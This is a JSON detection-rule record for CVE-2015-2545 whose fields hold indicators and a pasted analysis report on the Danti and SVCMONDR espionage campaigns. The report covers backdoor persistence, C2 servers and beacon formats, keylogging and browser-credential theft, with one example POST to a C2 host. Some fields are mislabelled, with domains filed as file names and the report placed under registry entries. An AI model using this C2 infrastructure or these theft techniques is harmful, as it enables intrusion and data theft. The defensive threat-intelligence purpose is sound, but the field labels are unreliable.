{"rule_id": 358, "name": "cve-2015-2545-overview-of-current-threats", "description": "-", "references": [], "File_Names": ["potplayer.dll", "wordpade.exe", "vastuXX.nic", "appinfo.dat", "PotPlayerMini.exe", "ocaler.mooo", "server.lan", "makescr.dat", "dynssl.com", "Appinfo.dat", "nic.in", "PotPlayer.pdb", "svcmondr.exe", "IXP000.TMP", "image001.eps", "eranger.com", "2016.docx", "mshtml.dll", "svcmondr.ex", "3\u8aaa\u660e\u6a94.doc", "List.doc", "PotPlayer.dll", "m1.jpg", "mout.gmx", "EPSIMP32.FLT", "dumps.dat", "indianembassy.hu", "ServiceExe.pdb", "image002.gif", "carwiseplot.no", "update.dat", "image002.eps", "news.asp", "logins.json", "memstatus.txt", "http.exe", "Hotels.doc"], "MD5_Hashes": ["046b98a742cecc11fb18d9554483be2d", "a90a329335fa0af64d8394b28e0f86c1", "Fd6636af7d2358c40fe6923b23a690e8", "3fbe576d33595734a92a665e72e5a04f", "b751323586c5e36d1d644ab42888a100", "8052234dcd41a7d619acb0ec9636be0b", "d44e971b202d573f8c797845c90e4658", "aae962611da956a26a76d185455f1d44", "8ad9cb6b948bcf7f9211887e0cf6f02a", "Aebf03ceaef042a833ee5459016f5bde", "be0cc8411c066eac246097045b73c282", "bae673964e9bc2a45ebcc667895104ef", "98c57aa9c7e3f90c4eb4afeba8128484", "B751323586c5e36d1d644ab42888a100", "6bbdbf6d3b24b8bfa296b9c76b95bb2f", "1aefd1c30d1710f901c70be7f1366cae", "8FC628C9F43D42E2B77C2801518AF2A5", "2460871a040628c379e04f79af37060d", "C591263d56b57dfadd06a68dd9657343", "07f4b663cc3bcb5899edba9eaf9cf4b5", "332397ec261393aaa58522c4357c3e48", "3ed40dec891fd48c7ec6fa49b1058d24", "d0533874d7255b881187e842e747c268", "1ba92c6d35b7a31046e013d35fa48775", "9469dd12136b6514d82c3b01d6082f59", "f4c1e96717c82b14ca76384cb005fbe5", "8cd2eb90fabd03ac97279d398b09a5e9", "4902abe46039d36b45ac8a39c745445a", "d0407e1a66ee2082a0d170814bd4ab02", "7a60da8198c4066cc52d79eecffcb327", "6d55eb3ced35c7479f67167d84bf15f0", "D91f101427a39d9f40c41aa041197a9c", "f16903b2ff82689404f7d0820f461e5d"], "SHA1_Hashes": [], "SHA256_Hashes": [], "Registry_Entries": ["HKEY_CURRENT_USER\\ Software\\Microsoft\\Windows\\CurrentVersion\\Run with the name\n\n\f\u201cpotplayer\u201d.\n\nOpens \u201cupdate.dat\u201d file, decrypts it with xor operations and passes the execution to the result buffer.\n\n\u201cupdate.dat\u201d, a backdoor:\n\nMakes its first GET request to hardcoded CnC \u201cnewsupdate.dynssl.com/index.html\u201d in order to get the\n\nnew CnC in the response.\n\nIf 407 response code is returned (Proxy authentication required) then the sample sends the request\n\nagain with \u201cproxyname\u201d string as the proxy username and \u201cproxypass\u201d string as the proxy password.\n\nThat suggests that may be the sample is compiled using some builder where these parameters must be\n\nset manually and in this specific sample were not changed from default.\n\nFinds \u201c8FC628C9F43D42E2B77C2801518AF2A5\u201d substring and decrypts it using AES CTR mode\n\nthrice using three 16-bytes keys.\n\nMakes a POST request to the new CnC with \u201cim=validate\u201d URL parameter and expects \u201csuccess\u201d\n\nstring as the response.\n\nForms the following structure in order to send to CnC in POST-request after AES encryption:\n\n\u201cCFB4CDE8-9285-4CC2-ACE2-CD9CCDF22C0D\u201d string\n\nLocal IP\n\nHost name\n\n0x3E9 dword\n\nOS version\n\nSYSTEM_INFO structure\n\nDecrypts the response using AES with one key.\n\nCommands:\n\nPasses execution to the new buffer\n\nEnumerates drives and their type\n\nEnumerates given registry key and value\n\nEnumerates processes\n\nDeletes given file\n\nCreates given process\n\nWrites to file and launches it\n\nEnumerates services\n\nTerminates given process\n\nProvides shell via cmd.exe\n\nThe malware connects to the following C2s:\n\nnewsupdate.dynssl.com (103.61.136.120)\n\ndnsnews.dns05.com (118.193.12.252)\n\n\fThe connection:\n\nThe two hosts are dynamic DNS subdomains, using the provider CHANGEIP DNS.\n\nIn December 2015, we uncovered another example of the type of shellcode found in the exploit for\n\n\fCVE-2015-2545. On 11 December, a spear-phishing email was sent by attackers to an employee of a\n\nTaiwanese security software reseller.\n\nSpear-phishing email\n\nThe attachment contained a Web Archive File with \u201c1-3\u8aaa\u660e\u6a94.doc\u201d and a malicious EPS file inside.\n\n\f\u201c1-3\u8aaa\u660e\u6a94.doc\u201d\n\nThis EPS (98c57aa9c7e3f90c4eb4afeba8128484) is exploit CVE-2015-2545 and contains an encrypted\n\nbinary starting with \u201cPdPD\u201d (50 64 50 44), the same as seen in the Danti attacks.\n\nThe structure of the Web Archive also carries references to the same files as the Danti group (with\n\nimage002.gif and \u201cimage002.eps\u201d.) However, the files themselves are absent from the archive.\n\n\fPart of the Web Archive\n\nThis resemblance could mean that we can attribute this case to the Danti group. However, it could also\n\nbe a coincidence or yet another case of different groups using the same malicious code. That\u2019s why we\n\nare noting this incident separately from the Danti group\u2019s activity.\n\nInterestingly, in the first few days of December, another group \u2013 APT16 (FireEye\u2019s classification) also\n\ntargeted Taiwan-based organizations with a CVE-2015-2545 EPS exploit, and its emails originated from\n\nthe same domain as the one sent by the SVCMONDR attackers. However, it used another type of\n\nshellcode and a different backdoor \u2013 ELMER.\n\nAfter opening the doc file (which is again a Web Archive File), the exploit drops and executes the Trojan\n\nprogram \u201csvcmondr.exe\u201d (8052234dcd41a7d619acb0ec9636be0b).\n\nThis queries the registry:\n\n\u201cHKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\n\nSettings\\Connections\\DefaultConnectionSettings\u201d and\n\n\u201cHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\InternetSettings\\Connections\\DefaultConnectionS\n\nettings\u201d and compares the values. If they don\u2019t coincide, it sets the \u201cDefaultConnectionSettings\u201d value\n\nfrom the HKEY_USERS to HKCU key.\n\nIt sets values taken from:\n\n\f1.  HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\\n\n{A8A88C49-5EB2-4990-A1A2-0876022C854F}\n\n2.  HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\\n\n{AEBA21FA-782A-4A90-978D-B72164C80120}\n\n3.  HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\1A10\n\nTo the appropriate HKCU key (for example:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\ {A8A88C49-5EB2-4990-\n\nA1A2-0876022C854F}, etc.).\n\nThen forms the structure in order to send it to the CnC in a POST-request with the following fields:\n\n0x8888 constant\n\n0x8000 constant\n\n18-bytes hex string based on CoCreateGuid function\n\nLocal IP\n\nMAC address\n\nExample of POST request\n\nIt encodes the resulting structure with base64. Example of a POST request:\n\nPOST / HTTP/1.1\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\n\nHost: 59.188.13.204:9080\n\nContent-Length: 112\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nAAAAAIiIAAAAgAAAAAAAAGQwNTRlYTkxMDAwMGEyZmU3NAAAAAAAAAAAAAAAAAAAMTAuNjMu\n\nMTIuNAAAAAAAADAwMEMyOUU5Nzg2QgAAAAAAAAAA\n\nBased on the CnC response, the sample:\n\nChecks the password in the CnC response and compares it with the hardcoded password \u201c1010\u201d in\n\nits configuration structure. If the password is valid, it sets a \u201ccertified\u201d flag and can further process\n\nthe following commands.\n\nLaunches given command line with ShellExecute, writes output results to %tmp% file, sends results\n\nto CnC and deletes the file.\n\nDownloads file to %Temp% folder.\n\nUploads given file to CnC.\n\nSets sleep interval.\n\n\fAll results sent to the CnC after processing commands are encrypted with RC4 with a MAC-address as\n\na key.\n\nThe CnC points to an IP address in Hong Kong. This IP address belongs to a local private company,\n\nbut falls within a range of IP addresses that belong to another enterprise that has already been\n\nidentified as a host location for command and control servers that communicate with malware.\n\nThe CnC has been used in other APT incidents, attributed by FireEye to the group \u201cadmin@338\u201d aka\n\n\u201cTemper Panda\u201d (59.188.0.197, accounts.serveftp.com).\n\nIn general, this IP address space from \u201cNew World Telecom HK\u201d is one of the favorite places used by\n\ndifferent Chinese-origin APT groups to host command & control servers/proxies.\n\nAnother detail suggesting a possible relationship between SVCMONDR and Temper Panda is the use\n\nof the \u201cPdPD\u201d (50 64 50 44) marker for encrypted binaries. According to Crowdstrike, the same marker\n\nhas been used previously by a number of APT groups (Anchor Panda, Samurai Panda and Temper\n\nPanda).\n\nThe latest known activity of \u201cadmin@338\u201d was in August 2015, when it was used to target Hong Kong-\n\nbased media using its own tools, LOWBALL and BUBBLEWRAP.\n\nHowever, we are unable to draw any conclusion regarding the relationship between the SVCMONDR\n\ngroup and Temper Panda.\n\nAccording to KSN data, in addition to Taiwan, there are some SVCMONDR victims in Thailand.\n\nWe are currently aware of at least four different APT actors actively using exploits of the CVE-2015-\n\n2545 vulnerability: TwoForOne (also known as Platinum), EvilPost, APT16 and Danti.\n\nThese groups have their own toolsets of malicious program. Danti\u2019s arsenal is more extensive than\n\nthose of EvilPost and APT16, and in terms of functionality can be compared with Platinum. All groups\n\nare focused on targets in the Asian region and have never been seen in incidents in Western Europe or\n\nthe USA.\n\nThe TwoForOne (Platinum) group is described in Microsoft research, APT16 in FireEye reports, and\n\nEvilPost and Danti in Kaspersky Lab private reports.\n\nDanti is highly focused on diplomatic entities. It may already have full access to internal networks in\n\nIndian government structures. According to Kaspersky Security Network, some Danti Trojans have also\n\nbeen detected in Kazakhstan, Kyrgyzstan, Uzbekistan, Myanmar, Nepal and the Philippines.\n\nDespite the fact that Danti uses a 1-day exploit, the group is able to make its own modifications to\n\nbypass current antivirus detections. A number of the modules used by Danti have the same\n\n\ffunctionality as previously known and used malicious programs like NetTraveller and DragonOK.\n\nThe use of CVE-2015-2545 exploits is on the rise. In addition to the groups mentioned above, we have\n\nseen numerous examples of these exploits being used by traditional cybercriminals in mass mailings in\n\nFebruary-April 2016. Such attacks mostly target financial institutions in Asia. Specifically, attacks have\n\nbeen recorded in Vietnam, the Philippines and Malaysia. There are reasons to believe that Nigerian\n\ncybercriminals are behind these attacks. In some cases, the infrastructure used is the same as the one\n\nwe saw when analyzing the Adwind Trojan.\n\nWe expect to see more incidents with this exploit and we continue to monitor new waves of attacks and\n\nthe potential relationship with other attacks in the region.\n\nTo know more about how to address the issue of known vulnerabilities most properly, read  this\n\npost in the Kaspersky Business Blog.\n\nAdditional references:\n\nThe EPS Awakens\n\nPart 1\n\nPart 2\n\nUnit 42 Identifies New DragonOK Backdoor Malware Deployed Against Japanese Targets\n\nNew Poison Ivy Rat Variant targets Hong-Kong-Pro-Democracy Activists\n\nMicrosoft research \u201cPlatinum\u201d\n\nEvilPost attacks (Kaspersky Lab Private Report, March 2016)\n\nFile MD5: a90a329335fa0af64d8394b28e0f86c1\n\nFile type: Encapsulated Postscript File\n\nSize: 189\u2019238 bytes\n\nFile Name: image001.eps (from HQ list)\n\nThis EPS file contains a shellcode that decrypts and saves file \u201clsass.exe\u201d and decoy document to disk.\n\nThe dropped malicious files are described below.\n\nFile MD5: 07f4b663cc3bcb5899edba9eaf9cf4b5\n\n\fFile type: Encapsulated Postscript File\n\nSize: 211\u2019766 bytes\n\nFile Name: image001.eps (from Mission list)\n\nThis EPS file contains a shellcode that decrypts and saves file \u201clsass.exe\u201d and decoy document to disk.\n\nThe dropped malicious files are described below.\n\nFile MD5: b751323586c5e36d1d644ab42888a100\n\nFile type: Encapsulated Postscript File\n\nSize: 398\u2019648 bytes\n\nFile Name: image001.eps (from India\u2019s 10 Top Luxury Hotels)\n\nThis EPS file contains a shellcode that decrypts and saves the dropper file (Windows CAB) and decoy\n\ndocument to disk.\n\nThe dropper and dropped malicious file \u201chttp.exe\u201d are described below.\n\nFile Name\n\nlsass.exe\n\nMD5\n\nFile type\n\nCompilation\n\ntimestamp\n\n8ad9cb6b948bcf7f9211887e0cf6f02a\n\nPE32 executable for MS Windows (GUI) Intel 80386\n\n32-bit\n\n2015-12-28 07:47:54\n\nPE Resources\n\nBIN (CHINESE SIMPLIFIED)\n\nSize\n\n138\u2019240 bytes\n\nURL: http://goback.strangled[.]net:443/ [random string] \n\nTYPE: POST\n\nUSER AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET\n\nCLR 3.0.04506.648; .NET CLR 3.5.21022)\n\nReal IP: 180.150.227.135:443\n\nDrops file from its resource section to %ALLUSERSPROFILE%\\ IEHelper\\mshtml.dll. The backdoor\n\nthen writes a string to a given offset with the value dependent on the %ALLUSERSPROFILE%\n\nenvironment variable.\n\nThus, the md5 of dropped files can vary. Examples of md5 with standard variables:\n\n\fbe0cc8411c066eac246097045b73c282\n\nbae673964e9bc2a45ebcc667895104ef\n\nSets registry:\n\nIf user is not admin\n\n\u201cHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersio\\Run\u201d value {53372C34-\n\nA872-FACF-70A7-A23C81C766C4} = \u201cC:\\Windows\\System32\\rundll32.exe %ALLUSERSPROFILE%\\\n\n\\IEHelper\\mshtml.dll, IEHelper\u201d\n\nIn any case:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Active Setup\\Installed Components\\{53372C34-A872-\n\nFACF-70A7-A23C81C766C4}\u201d value \u201cStubPath\u201d = \u201cC:\\Windows\\System32\\rundll32.exe\n\n%ALLUSERSPROFILE%\\ \\IEHelper\\mshtml.dll, IEHelper\u201d\n\nSets the following values before creating the instance of IE for communicating with the CnC:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\ DisableFirstRunCustomize=1\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\ Check_Associations=\u201dno\u201d\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Internet Connection Wizard\\ Completed=1\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\\n\nIEHarden=0\n\nCollects the following info, encodes with base64 and sends to the CnC:\n\nMemory status\n\nOS version\n\nUser name\n\nOEM code page identifier\n\nLocal IP\n\nCPU speed\n\nForms the following body in POST request to the CnC:\n\n\u2014-=_Part_%x\n\nContent-Disposition: form-data; name=\u201dm1.jpg\u201d\n\nContent-Type: application/octet-steam\n\n%base64%\n\n\u2014-=_Part_%x\n\nWhere %x \u2013 decrypted adapter\u2019s MAC address based on xor operation.\n\nThe URL path in the POST request is generated randomly with uppercase letters.\n\n\fExample of CnC communication:\n\nBased on the CnC response, the sample:\n\nProvides shell via cmd.exe\n\nCreates directory\n\nLists files in directory\n\nDeletes file\n\nUploads given file to CnC\n\nEnumerates drives, gets their type and available space\n\nLaunches given file\n\nMoves file\n\nWrites and appends to given file\n\nUninstalls itself\n\nFile Name\n\nmshtml.dll\n\nMD5\n\nor bae673964e9bc2a45ebcc667895104ef \n\nbe0cc8411c066eac246097045b73c282 \n\nor different\n\nPE32 executable for MS Windows (DLL) (GUI) Intel\n\n80386 32-bit\n\n2015-12-28 07:45:20\n\nFile type\n\nCompilation\n\ntimestamp\n\nSize\n\n72\u2019192 bytes\n\nmshtml.dll repeats entirely the functionality of its dropper (CnC communication and commands\n\nprocessing) in its \u201cIEhelper\u201d export and is built on the same source code.\n\n\fMD5 6bbdbf6d3b24b8bfa296b9c76b95bb2f | Sun, 13 Apr 2008 18:32:45 GMT\n\nDrops file to %Temp%\\IXP000.TMP\\http.exe and launches it.\n\nFilename http.exe\n\nMD5\n\n3fbe576d33595734a92a665e72e5a04f | Wed, 13 Jan 2016 10:25:10\n\nGM\n\nCnC\n\ncarwiseplot.no-ip.org/news/news.asp\n\nSets registry:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n\u201cIME_hp\u201d = %ALLUSERPROFILE%\\Accessories\\wordpade.exe\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n\u201cIME_hp\u201d = %ALLUSERPROFILE%\\Accessories\\wordpade.exe\n\nHKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n\u201cIME_hp\u201d = %ALLUSERPROFILE%\\Accessories\\wordpade.exe\n\nCopies itself to %ALLUSERPROFILE%\\Accessories\\ wordpade.exe, launches it and exits self-process.\n\nwordpade.exe file proceeds:\n\nCreates mutex \u201cGlobal\\wordIE\u201d. Stores keystrokes and windows titles to %Temp%\\dumps.dat and xors\n\nit with 0x99.\n\nKnocks to CnC via IE instance: carwiseplot.no-ip.org/news/news.asp\n\nIncludes the following field in HTTP-header:\n\nCookie: ID=1%x, where %x \u2013 Volume Serial number of disk C\n\n\fBased on the CnC response, the sample:\n\nProvides shell via cmd.exe\n\nLists files in all drives and writes to given file\n\nRetrieves OS version, Local IP, installed browser, Computer name, User name and writes to given\n\nfile\n\nWrites to given file\n\nDeletes given file\n\nUploads given file to CnC\n\nMakes screenshots and writes to file %Temp%\\makescr.dat\n\nRetrieves proxy settings and proxy authentication credentials from Mozilla (signons.sqlite,\n\nlogins.json) and Chrome files (%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login\n\nData), Microsoft WinInet storage, Microsoft Outlook\n\nEmails:\n\naae962611da956a26a76d185455f1d44 (chancery@indianembassy.hu) \n\n3ed40dec891fd48c7ec6fa49b1058d24 (amb.bogota@mea.gov.in)\n\n1aefd1c30d1710f901c70be7f1366cae (amb.copenhagen@mea.gov.in)\n\nf4c1e96717c82b14ca76384cb005fbe5 (India, dsfsi@nic.in)\n\n1ba92c6d35b7a31046e013d35fa48775 (India, chumarpost@gmail.com)\n\n6d55eb3ced35c7479f67167d84bf15f0 (India, Cabinet Secretary)\n\nDoc (Web Archive File):\n\nC591263d56b57dfadd06a68dd9657343 (HQ List)\n\nAebf03ceaef042a833ee5459016f5bde (Mission List)\n\nFd6636af7d2358c40fe6923b23a690e8 (India\u2019s 10 Top Luxury Hotels)\n\nDocx:\n\nD91f101427a39d9f40c41aa041197a9c (Holidays in India in 2016)\n\nEPS:\n\n07f4b663cc3bcb5899edba9eaf9cf4b5 (India, from Mission list)\n\na90a329335fa0af64d8394b28e0f86c1 (India, HQ List)\n\n\fB751323586c5e36d1d644ab42888a100 (India, Hotels)\n\n8cd2eb90fabd03ac97279d398b09a5e9 (Holidays in India in 2016)\n\nCAB dropper:\n\n6bbdbf6d3b24b8bfa296b9c76b95bb2f\n\nRarSFX:\n\nd0407e1a66ee2082a0d170814bd4ab02\n\n4902abe46039d36b45ac8a39c745445a\n\nPotplayer:\n\nf16903b2ff82689404f7d0820f461e5d (clean tool)\n\nTrojans:\n\n6bbdbf6d3b24b8bfa296b9c76b95bb2f (dropper, from cab-archive)\n\n3fbe576d33595734a92a665e72e5a04f (http.exe)\n\n8ad9cb6b948bcf7f9211887e0cf6f02a (lsass.exe)\n\n9469dd12136b6514d82c3b01d6082f59\n\nbe0cc8411c066eac246097045b73c282 (mshtml.dll)\n\nbae673964e9bc2a45ebcc667895104ef\n\nd44e971b202d573f8c797845c90e4658 (update.dat)\n\n332397ec261393aaa58522c4357c3e48 (potplayer.dll)\n\n2460871a040628c379e04f79af37060d (appinfo.dat)\n\nC2\n\n74.208.4.200\n\n74.208.4.201\n\n180.150.227.135\n\nGoback.strangled[.]net:443\n\ncarwiseplot.no-ip[.]org (115.144.69.54, 115.144.107.9)\n\nnewsupdate.dynssl[.]com (103.61.136.120)\n\ndnsnews.dns05[.]com (118.193.12.252)\n\nEmails:\n\n7a60da8198c4066cc52d79eecffcb327 (Taiwan, janet@eranger.com.tw)\n\nDoc (Web Archive File):\nd0533874d7255b881187e842e747c268 (Taiwan, 1-3\u8aaa\u660e\u6a94.doc)\n\nEPS:\n\n98c57aa9c7e3f90c4eb4afeba8128484 (Taiwan)\n\nTrojans:\n\n\f8052234dcd41a7d619acb0ec9636be0b (svcmondr.ex, Taiwan)\n\n046b98a742cecc11fb18d9554483be2d (svcmondr.ex,Thailand)\n\nC2:\n\n59.188.13.204\n\n180.128.10.28\n\nwww.ocaler.mooo[.]com\n\nwww.onmypc.serverpit[.]com\n\n151\n\n8\n\n7758\n\n0\n\n88\n\n4\n\n1015\n\n0\n\n138\n\n11\n\n3343\n\n1\n\nYour email address will not be published. Required fields are marked *\n\nEnter your comment here\n\nName * \n\nEmail * \n\n\fI'm not a robot\n\n Notify me of follow-up comments by email.\n\nreCAPTCHA\n\n Notify me of new posts by email.\n\nIT threat evolution in Q1 2016\n\nKaspersky Security Bulletin 2015. Overall statistics for 2015\n\nKaspersky Security Bulletin 2015. Evolution of cyber threats in the corporate sector\n\nKaspersky Security Bulletin 2015. Top security stories\n\nRussian financial cybercrime: how it works\n\nATM infector\n\nResults of PoC Publishing\n\nContributing to the Annual DBIR\n\nFreezer Paper around Free Meat\n\nThank you, CanSecWest16!\n\n \n\f151\n\n8\n\n0\n\n58\n\n5\n\n0\n\n88\n\n4\n\n0\n\n\u00a9 2016 AO Kaspersky Lab. All Rights Reserved. Registered trademarks and service marks are the property of their respective\n\n \n \n \n \n \n \n\fowners.\n\nContact us | Read our privacy policy\n\nEvents\n\nIncidents\n\nOpinions\n\nResearch\n\nSpam Test\n\nVirus Watch\n\nWebcasts\n\nContacts\n\nRSS feed\n\nSearch\n\n \n\f"], "URLs": ["http://goback.strangled[.]net:443/"], "weight": 0.0}